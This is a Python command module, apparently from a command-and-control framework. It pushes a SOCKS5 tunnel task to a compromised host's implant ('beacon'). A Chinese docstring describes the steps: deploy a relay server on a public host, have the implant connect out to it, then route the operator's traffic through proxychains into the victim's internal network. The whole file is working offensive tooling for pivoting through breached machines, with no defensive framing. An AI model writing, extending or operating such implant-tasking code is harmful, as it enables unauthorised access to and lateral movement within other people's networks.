"""socks — 下发植入物端 SOCKS5 隧道(连接独立部署的 socks_server)

socks <server_ip> <tunnel_port> [beacon_id]
  server_ip:    socks_server 部署机地址
  tunnel_port:  socks_server 隧道端口(植入物连接)
  beacon_id:    可选,默认当前选中 beacon

配合流程:
  1) s_exec socks_server <tunnel_port> → 生成服务端部署代码, 部署到公网服务器
  2) 本命令把植入物端 socks 模块下发执行 → 植入物连上 socks_server
  3) 操作机 proxychains 配 socks5 <server_ip>:<socks_port> 访问目标内网
"""


def run(disp, args):
    if len(args) < 2:
        return "[!] usage: socks <server_ip> <tunnel_port> [beacon_id]"
    sip, spt = args[0], args[1]
    bid, _ = disp.resolve_beacon(args[2:])
    if not bid:
        return "[!] 未指定 Beacon"
    try:
        task = disp.build_task_for(bid, "socks", [sip, spt])
    except ValueError as e:
        return f"[!] {e}"
    if task is None:
        return "[!] socks module not loaded"
    return disp.push_task(bid, task)
